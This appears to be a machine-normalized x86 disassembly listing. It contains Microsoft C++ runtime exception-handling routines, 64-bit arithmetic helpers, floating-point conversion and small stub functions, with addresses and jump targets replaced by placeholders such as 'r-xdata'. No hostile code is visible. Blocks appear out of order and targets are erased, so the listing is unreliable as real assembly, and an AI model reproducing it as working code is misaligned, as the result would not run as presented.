cmp eax 0x19930522
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
add eax 0x8
push eax
call sub_4255b9
push eax
call sub_427fd0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
dec edi
add esi 0x4
pop edi
pop esi
pop ebp
retn
sub_448ec4
push 0x2c
push r--data
call sub_4278c0
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_448490
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_426c39
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_426c39
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_426c39
mov [ eax + 0x88 ] esi
call sub_426c39
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_448535
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_448fea
mov eax [ ebp - 0x1c ]
call sub_427905
retn
sub_448f5d
mov esp [ ebp - 0x18 ]
call sub_426c39
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_448882
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_448fea
mov eax [ ebp - 0x1c ]
call sub_427905
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_448fea
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_4484e3
pop ecx
call sub_426c39
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_426c39
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_4484bc
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_4489a3
pop ecx
pop ecx
sub_449060
push 0xc
push r--data
call sub_4278c0
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_449bb8
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_449bb8
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42b1e5
push ebx
push esi
call sub_449bca
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_449bb8
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_449bb8
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_449bca
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_449bca
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_449bca
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_424b60
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_449bdc
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_4489f8
pop ecx
pop ecx
push eax
push esi
call sub_424b60
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_427905
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_4489f8
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_4491df
push 0x8
push r--data
call sub_4278c0
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_4489f8
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_448151
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_449060
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_4489f8
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_448158
jmp r-xdata
sub_449271
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x10
test eax eax
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
leave
retn
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
cmp eax 0xe06d7363
jne r-xdata
cmp eax 0xe0434352
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_426c39
inc [ eax + 0x90 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
test bl 0x40
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
call sub_426c39
cmp [ eax + 0x88 ] 0x0
jne r-xdata
cmp eax 0x19930522
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
or ebx 0x80000000
mov [ ebp - 0xc ] edi
mov edi [ eax ]
mov [ ebp - 0x10 ] ebx
lea ebx [ eax + 0x4 ]
jmp r-xdata
call sub_426c39
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
test edi edi
jg r-xdata
call sub_426c39
mov esi [ eax + 0x88 ]
mov eax [ ebx ]
push [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4487d4
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
call sub_426c39
inc [ eax + 0x90 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
dec edi
add ebx 0x4
xor eax eax
inc eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_4491df
add esp 0x10
jmp r-xdata
sub_4493bf
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_4491df
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_448118
call sub_44815f
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_448882
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_448ec4
add esp 0x28
test eax eax
je r-xdata
sub_44942d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_426c39
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_426c39
lea edi [ eax + 0x80 ]
call sub_426a4c
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_44841d
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_42b1e5
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4482a7
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4493bf
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_449534
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_42b1e5
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_426c39
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_42b1e5
call sub_42b199
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_44942d
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_426c39
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_426c39
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_426c39
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_449bb8
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_44841d
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_42b1e5
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_4489a3
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_426c39
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_426c39
mov edi [ eax + 0x94 ]
call sub_426c39
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_448d4d
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_448d4d
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_425554
test al al
jne r-xdata
call sub_42b1e5
cmp eax 0x19930522
jne r-xdata
call sub_426c39
call sub_426c39
call sub_426c39
mov [ eax + 0x88 ] esi
call sub_426c39
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_4487d4
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4489a3
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_4252f8
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_426f77
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_4493bf
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_44815f
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_448882
add esp 0x10
push [ esi + 0x1c ]
call sub_448dc3
sub_4498c6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_426c39
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_449534
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_448882
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4499b0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_449a18
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x34 ]
mov esi ebx
call sub_42b774
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x34 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x28 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x34 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_43d336
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_449bf0
add esp 0xc
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x24 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ecx + 0x10 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x24 ]
call sub_4268f3
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_449b60
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_437d3c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_437d3c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_449bf0
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_43fcd2
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43eb74
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_449ca0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_449cdc
cmp [ rw-data ] 0x0
je sub_449cf6
sub esp 0x4
fnstcw [ esp ]
pop eax
and ax 0x7f
cmp ax 0x7f
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_449cf6
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_402b76
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402b92
mov [ ecx ] r--data
jmp sub_425354
sub_402bc2
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_402bca
retn
sub_402bcb
push esi
push edi
mov edi eax
mov esi edx
xor eax eax
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
retn
sbb eax eax
sbb eax 0xffffffff
sub_402bdf
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
pop ebp
retn
sub_402bf3
push ebp
mov ebp esp
pop ebp
jmp sub_4247f0
sub_402bfc
push ebp
mov ebp esp
pop ebp
jmp sub_424b60
sub_402c05
push ebp
mov ebp esp
push [ ebp + 0xc ]
movsx eax al
push eax
push [ ebp + 0x8 ]
call sub_4338e0
add esp 0xc
pop ebp
retn
sub_402c1c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov al [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
pop ebp
retn
sub_402c2b
mov al [ eax ]
xor ecx ecx
cmp al [ edx ]
sete al
retn
sub_402c35
mov al [ eax ]
retn
sub_402c38
movzx eax [ eax ]
retn
sub_402c3c
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_402c46
xor eax eax
retn
sub_402c49
or eax 0xffffffff
retn
sub_402c4d
push ebp
mov ebp esp
push [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4255d8
add esp 0xc
pop ebp
retn
sub_402c83
or al 0xff
retn
sub_402c86
or eax 0xffffffff
retn
sub_402c8a
retn
sub_402c8b
retn
sub_402c8c
retn
sub_402c8d
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
retn
sub_402c95
and [ eax ] 0x0
retn
sub_402c99
retn
sub_402c9a
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
retn
sub_402ca2
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
mov ecx [ ecx ]
test ecx ecx
je r-xdata
retn
mov ecx [ ecx ]
test ecx ecx
je r-xdata
mov ecx [ ecx ]
mov [ eax ] ecx
sub_402cba
mov ecx [ ecx ]
cmp [ eax ] ecx
je r-xdata
retn
mov ecx [ ecx ]
test ecx ecx
je r-xdata
mov ecx [ ecx ]
mov [ eax ] ecx
sub_402ccb
retn
sub_402ccc
test eax eax
je r-xdata
retn
mov eax [ eax ]
mov [ ecx ] eax
sub_402cd5
mov eax [ eax ]
test eax eax
jne r-xdata
mov eax [ eax ]
retn
retn
sub_402cdf
retn
sub_402ce0
retn
sub_402ce1
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
j_sub_425354#7
jmp sub_425354
sub_402e37
call sub_4466a8
mov [ esi ] eax
